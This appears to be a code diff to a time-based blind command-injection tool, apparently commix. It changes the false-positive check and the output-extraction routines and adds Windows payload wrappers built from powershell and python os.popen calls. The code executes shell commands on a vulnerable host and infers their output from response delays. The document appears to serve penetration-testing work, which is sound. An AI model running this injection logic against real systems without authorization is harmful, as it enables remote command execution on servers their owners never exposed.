@@ -85,7 +85,6 @@ def examine_requests(payload, vuln_parameter, http_request_method, url, timesec,
 
   end  = time.time()
   how_long = int(end - start)
-
   return how_long
 
 """
@@ -252,12 +251,12 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, 
 
   # Proceed with the next (injection) step!
   if found_chars == True : 
+    if settings.TARGET_OS == "win":
+      cmd = previous_cmd
     num_of_chars = output_length + 1
     check_start = 0
     check_end = 0
     check_start = time.time()
-    if settings.TARGET_OS == "win":
-      cmd = previous_cmd
     output = []
     percent = "0.0"
     info_msg = "Presuming the execution output, please wait... " 
@@ -365,8 +364,16 @@ False Positive check and evaluation.
 """
 def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timesec, http_request_method, url, vuln_parameter, randvcalc, alter_shell, how_long, url_time_response):
 
+  if settings.TARGET_OS == "win":
+    previous_cmd = cmd
+    if alter_shell:
+      cmd = settings.WIN_PYTHON_DIR + " -c \"import os; print len(os.popen('cmd /c " + cmd + "').read().strip())\""
+    else: 
+      cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim().length"
+
   found_chars = False
-  info_msg = "Testing the reliability of used payload... "
+  info_msg = "Checking the reliability of the used payload "
+  info_msg += "in case of a false positive result... "
   if settings.VERBOSITY_LEVEL == 1: 
     sys.stdout.write(settings.print_info_msg(info_msg))
     sys.stdout.flush()
@@ -374,8 +381,11 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timese
   elif settings.VERBOSITY_LEVEL > 1:
     print settings.print_info_msg(info_msg)
 
+  # Varying the sleep time.
+  timesec = timesec + random.randint(1, 5)
+
+  # Checking the output length of the used payload.
   for output_length in range(1, 3):
-    
     # Execute shell commands on vulnerable host.
     if alter_shell:
       payload = tb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method)
@@ -427,6 +437,8 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timese
       break
 
   if found_chars == True : 
+    if settings.TARGET_OS == "win":
+      cmd = previous_cmd 
     num_of_chars = output_length + 1
     check_start = 0
     check_end = 0
@@ -436,8 +448,9 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timese
     percent = 0
     sys.stdout.flush()
 
+    is_valid = False
     for num_of_chars in range(1, int(num_of_chars)):
-      for ascii_char in range(1, 3):
+      for ascii_char in range(1, 20):
 
         if alter_shell:
           # Get the execution output, of shell execution.
@@ -488,8 +501,12 @@ def false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timese
 
         if (how_long >= settings.FOUND_HOW_LONG) and (how_long - timesec >= settings.FOUND_DIFF):
           output.append(ascii_char)
+          is_valid = True
           break
-      
+          
+      if is_valid:
+          break
+
     check_end  = time.time()
     check_how_long = int(check_end - check_start)
     output = "".join(str(p) for p in output)
